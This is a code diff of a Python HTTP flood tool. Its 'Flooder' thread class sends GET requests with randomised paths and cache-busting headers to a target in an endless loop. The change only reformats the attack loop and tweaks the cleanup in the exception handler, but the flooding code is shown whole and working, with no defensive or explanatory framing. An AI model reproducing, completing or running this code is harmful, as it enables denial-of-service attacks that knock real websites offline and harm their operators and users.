@@ -16,7 +16,6 @@ user_agent = "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, lik
 
 
 class Flooder(threading.Thread):
-
     def __init__(self):
         threading.Thread.__init__(self)
 
@@ -28,29 +27,29 @@ class Flooder(threading.Thread):
             sock.settimeout(30)
             sock.setblocking(0)
             while True:
-                    randstr = '/'+''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(5))
-                    q1 = str(round(random.uniform(0.5, 0.7), 1))
-                    q2 = str(round(random.uniform(0.7, 1), 1))
-                    cur_header = {
-                        "Host": " "+str(target.netloc),
-                        "Content-type": "application/x-www-form-urlencoded",
-                        "Accept": "text/plain; q=" + q1 + ", text/html, "
-                                                          "text/x-dvi; q=" + q2 + "; mxb=100000, text/x-c",
-                        "Keep-Alive": "300",
-                        "Connection": "Keep-Alive",
-                        "Cache-Control": "no-cache",
-                        "Pragma": "no-cache",
-                        "User-agent": user_agent,
-                        "Accept-Encoding": "gzip,deflate"
-                    }
-                    sock.sendall(str.encode("GET "+randstr+target.path+" HTTP/1.1\r\nHost: "+target.netloc+"\r\n"+str(cur_header)+"\r\n\r\n\r\n"))
+                randstr = '/' + ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(5))
+                q1 = str(round(random.uniform(0.5, 0.7), 1))
+                q2 = str(round(random.uniform(0.7, 1), 1))
+                cur_header = {
+                    "Host": " " + str(target.netloc),
+                    "Content-type": "application/x-www-form-urlencoded",
+                    "Accept": "text/plain; q=" + q1 + ", text/html, "
+                                                      "text/x-dvi; q=" + q2 + "; mxb=100000, text/x-c",
+                    "Keep-Alive": "300",
+                    "Connection": "Keep-Alive",
+                    "Cache-Control": "no-cache",
+                    "Pragma": "no-cache",
+                    "User-agent": user_agent,
+                    "Accept-Encoding": "gzip,deflate"
+                }
+                sock.sendall(str.encode(
+                    "GET " + randstr + target.path + " HTTP/1.1\r\nHost: " + target.netloc + "\r\n" + str(
+                        cur_header) + "\r\n\r\n\r\n"))
 
         except:
-            sock.shutdown(socket.SHUT_RDWR)
             sock.close()
             sys.exit()
             pass
-
 
 
 class Checker(threading.Thread):
